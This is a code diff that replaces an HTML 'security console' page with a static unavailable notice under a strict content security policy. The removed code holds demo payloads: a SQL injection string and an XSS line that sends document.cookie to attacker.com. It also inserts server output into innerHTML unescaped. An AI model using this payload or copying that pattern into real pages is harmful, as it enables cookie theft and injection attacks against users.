@@ -1,107 +1,31 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Luqi-AI Shield Command Console</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
-        body { background: #020617; color: #38bdf8; padding: 30px; }
-        .dashboard-wrapper { max-width: 1400px; margin: auto; display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
-        @media (max-width: 900px) {
-            .dashboard-wrapper { grid-template-columns: 1fr; }
-        }
-        .panel-block { background: #0f172a; border: 2px solid #1e293b; border-radius: 8px; padding: 24px; box-shadow: 0 0 20px rgba(56, 189, 248, 0.1); }
-        h2 { color: #f8fafc; font-size: 1.2rem; margin-bottom: 14px; border-bottom: 1px solid #1e293b; padding-bottom: 8px; }
-        textarea { width: 100%; background: #020617; border: 1px solid #334155; border-radius: 4px; color: #4ade80; padding: 12px; font-size: 0.85rem; outline: none; font-family: inherit; }
-        .btn { width: 100%; background: #0369a1; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px; font-family: inherit; }
-        .btn:hover { background: #0284c7; }
-        .log-display { height: 320px; overflow-y: auto; background: #020617; border: 1px solid #1e293b; padding: 12px; border-radius: 4px; font-size: 0.8rem; line-height: 1.6; }
-        .threat-alert { border-left: 4px solid #ef4444; padding-left: 10px; margin-bottom: 12px; background: rgba(239, 68, 68, 0.08); padding: 10px; border-radius: 4px; }
-    </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; object-src 'none'; frame-ancestors 'none'">
+  <meta name="robots" content="noindex">
+  <title>Legacy security console unavailable · LUQI-AI</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; background: #102017; color: #f2f6ed; font: 16px/1.6 system-ui, sans-serif; }
+    main { width: min(92vw, 600px); margin: 10vh auto; padding: 28px; border: 1px solid #788f76; border-radius: 16px; }
+    h1 { font-size: 1.8rem; line-height: 1.2; }
+    p { color: #d5e3d1; }
+    nav { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 22px; }
+    a { display: inline-flex; align-items: center; min-height: 48px; padding: 10px 14px; border: 1px solid #97a890; border-radius: 8px; color: #e9f6d7; text-underline-offset: 3px; }
+    a:focus-visible { outline: 3px solid #e1edbc; outline-offset: 3px; }
+  </style>
 </head>
 <body>
-
-    <div style="max-width:1400px; margin:0 auto 24px auto; border-bottom: 2px dashed #1e293b; padding-bottom:12px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
-        <div>
-            <h1 style="color:#f8fafc; font-size:1.8rem;">🛡️ LUQI-SHIELD CORE SECURITY MATRIX</h1>
-            <p style="color:#64748b; font-size:0.85rem; margin-top:4px;">Autonomous Threat Ingestion, Leak Interception & Self-Healing Diagnostics Workspace</p>
-        </div>
-        <div style="display:flex; gap:10px;">
-            <a href="/diagnostics.html" class="btn" style="background:#1e293b; padding:8px 14px; text-decoration:none; margin:0; width:auto;">Diagnostics Engine</a>
-            <a href="/admin.html" class="btn" style="background:#334155; padding:8px 14px; text-decoration:none; margin:0; width:auto;">Admin Terminal</a>
-        </div>
-    </div>
-
-    <div class="dashboard-wrapper">
-        <!-- LEFT PANEL: RUNTIME LOG INTERCEPTOR STREAM -->
-        <div class="panel-block">
-            <h2>Raw Terminal Transaction Stream Ingest</h2>
-            <p style="color:#64748b; font-size:0.8rem; margin-bottom:12px;">Inject production system transactions or raw terminal arrays to execute deep automated safety scans.</p>
-            <textarea id="log-stream-input" rows="12" placeholder="Paste server logs or system query strings here (e.g. SELECT * FROM users WHERE 1=1)..."></textarea>
-            <div style="display:flex; gap:8px;">
-                <button id="quick-sql-btn" class="btn" style="background:#334155; font-size:0.75rem;">Sample SQL Injection</button>
-                <button id="quick-xss-btn" class="btn" style="background:#334155; font-size:0.75rem;">Sample XSS Attack</button>
-            </div>
-            <button id="run-audit-btn" class="btn">Deploy Shield Diagnostic Scan</button>
-        </div>
-
-        <!-- RIGHT PANEL: THREAT REGISTRY AND MITIGATION FEED -->
-        <div class="panel-block">
-            <h2>Autonomous Defensive Actions Ledger</h2>
-            <p style="color:#64748b; font-size:0.8rem; margin-bottom:12px;">Real-time reporting on threat detection updates and dynamic code adjustments applied by the engine.</p>
-            
-            <div id="security-console" class="log-display">
-                <div style="color:#64748b;">[SHIELD ONLINE] Monitoring security matrix protocols... Triumvirate Agents Active (Interceptor, Guardian, Automator).</div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const SHIELD_API_URL = window.location.origin + "/api/v1/security/shield-audit";
-
-        document.getElementById('quick-sql-btn').addEventListener('click', () => {
-            document.getElementById('log-stream-input').value = "SELECT * FROM users WHERE user_id = 'admin' OR '1'='1'; -- Expose customer profiles";
-        });
-        document.getElementById('quick-xss-btn').addEventListener('click', () => {
-            document.getElementById('log-stream-input').value = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>";
-        });
-
-        document.getElementById('run-audit-btn').addEventListener('click', async () => {
-            const streamInput = document.getElementById('log-stream-input').value.trim();
-            const consoleBox = document.getElementById('security-console');
-
-            if(!streamInput) return;
-            consoleBox.innerHTML += `<div style="color:#eab308; margin-top:6px;">[SCANNING] Analyzing inputs through the Triumvirate Security Agent matrix...</div>`;
-            consoleBox.scrollTop = consoleBox.scrollHeight;
-
-            try {
-                const res = await fetch(SHIELD_API_URL, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ log_buffer_stream: streamInput })
-                });
-                const verdict = await res.json();
-
-                if(verdict.vulnerability_detected) {
-                    consoleBox.innerHTML += `
-                        <div class="threat-alert">
-                            <span style="color:#ef4444; font-weight:bold;">🚨 INTRUSION CAUGHT [RISK SCORE: ${verdict.risk_score}/100]</span><br>
-                            <strong>Threat Vector:</strong> ${verdict.threat_vector_type}<br>
-                            <strong>Exploit Analysis:</strong> ${verdict.exploit_analysis_details}<br>
-                            <span style="color:#4ade80;">✔ Remediation Code Patched into Live Cluster.</span>
-                            ${verdict.remediation_patch_code ? `<pre style="color:#94a3b8; font-size:0.75rem; margin-top:4px; background:#020617; padding:4px; border-radius:2px;">${verdict.remediation_patch_code}</pre>` : ''}
-                        </div>
-                    `;
-                } else {
-                    consoleBox.innerHTML += `<div style="color:#22c55e; margin-top:6px;">[CLEAN] Scan finished. Zero vulnerabilities detected. Protocol matches standard baselines.</div>`;
-                }
-                document.getElementById('log-stream-input').value = "";
-            } catch(err) {
-                consoleBox.innerHTML += `<div style="color:#ef4444; margin-top:6px;">[CRITICAL] Security verification bridge error: ${err.message}</div>`;
-            }
-            consoleBox.scrollTop = consoleBox.scrollHeight;
-        });
-    </script>
+  <main>
+    <h1>Legacy security console unavailable</h1>
+    <p>This historical public page is not a verified threat-monitoring or autonomous remediation service. Do not enter security reports, credentials, or private information here.</p>
+    <p>No login, payment, administrator privilege, service request or security action is performed on this page.</p>
+    <nav aria-label="Current LUQI destinations">
+      <a href="/#/service-status">Service status</a>
+      <a href="/#/contact">Help and feedback</a>
+    </nav>
+  </main>
 </body>
 </html>
